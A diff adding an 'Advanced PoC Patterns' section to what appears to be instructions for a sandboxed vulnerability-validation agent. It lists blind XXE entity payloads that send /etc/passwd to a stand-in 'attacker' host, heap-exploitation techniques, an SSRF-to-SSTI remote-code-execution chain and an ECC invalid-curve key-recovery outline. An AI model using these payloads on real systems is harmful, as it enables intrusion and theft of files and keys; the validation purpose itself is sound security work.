@@ -85,6 +85,31 @@ demonstrates the vulnerability. Execute the PoC in a sandbox to validate it.
    - For path traversal: read a known file (/etc/passwd, web.config)
    - For SSRF: access an internal service or metadata endpoint
 
+5. **Advanced PoC Patterns**:
+
+   Blind XXE with Out-of-Band (CWE-611):
+   - Craft external DTD on attacker server: <!ENTITY % data SYSTEM "file:///etc/passwd">
+   - Use parameter entity callback: <!ENTITY % exfil SYSTEM "http://attacker/%data;">
+   - Trigger via: <!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker/evil.dtd">%ext;]>
+   - Confirm via DNS/HTTP callback to attacker-controlled server
+   - For blind confirmation without OOB: use error-based XXE with invalid URI
+
+   Heap Exploitation (CWE-416 / CWE-415):
+   - tcache poisoning: free chunks to fill tcache bin, overwrite fd pointer, malloc at arbitrary address
+   - fastbin dup: double-free with size-matching allocations, corrupt fd chain
+   - House of Force: overflow top chunk size, allocate to target address
+   - UAF: free object, reallocate with controlled data, trigger virtual method call
+
+   SSRF→SSTI Chaining:
+   - Step 1: SSRF to access internal template rendering endpoint
+   - Step 2: Inject SSTI payload into internal request body/params
+   - Common chain: SSRF→internal API→template preview endpoint→RCE
+
+   ECC Invalid Curve Attack:
+   - Send point on a weak curve (different from server's curve) with small subgroup
+   - Recover private key bits modulo subgroup order via CRT
+   - Combine residues via Chinese Remainder Theorem to recover full private key
+
 ## Output Format
 For each validated PoC:
 - Vulnerability type and CWE
